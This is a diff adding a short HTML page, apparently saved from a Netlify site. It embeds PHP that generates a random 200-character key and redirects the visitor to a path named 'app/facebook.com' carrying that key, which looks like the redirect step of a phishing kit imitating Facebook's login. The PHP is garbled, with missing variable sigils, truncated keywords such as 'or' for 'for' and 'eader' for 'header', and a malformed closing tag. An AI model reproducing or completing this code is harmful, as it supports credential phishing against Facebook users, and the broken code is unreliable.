@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0062)https://hopeful-boyd-478ca1.netlify.app/par#0.7379579457019758 -->
+<html><head>
+</head>
+<article>
+<?php
+$string =  '<?php'.
+'longitud = \'200\';'.
+'key = \'\';'.
+'keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";'.
+'max = strlen($keys) - 1;'.
+'or($i=0; $i < $longitud; $i++){'.
+'key .= $keys{mt_rand(0,$max)};'.
+''.
+'$navigator_user_agent = (isset($_SERVER[\'HTTP_USER_AGENT\'])) ? strtolower($_SERVER[\'HTTP_USER_AGENT\']):\'\';'.
+''.
+'eader ("Location: app/facebook.com/?key=".$key); '.
+'>';
+
+ echo $string; 
+?>
+ </article>
+
+</div></body></html>
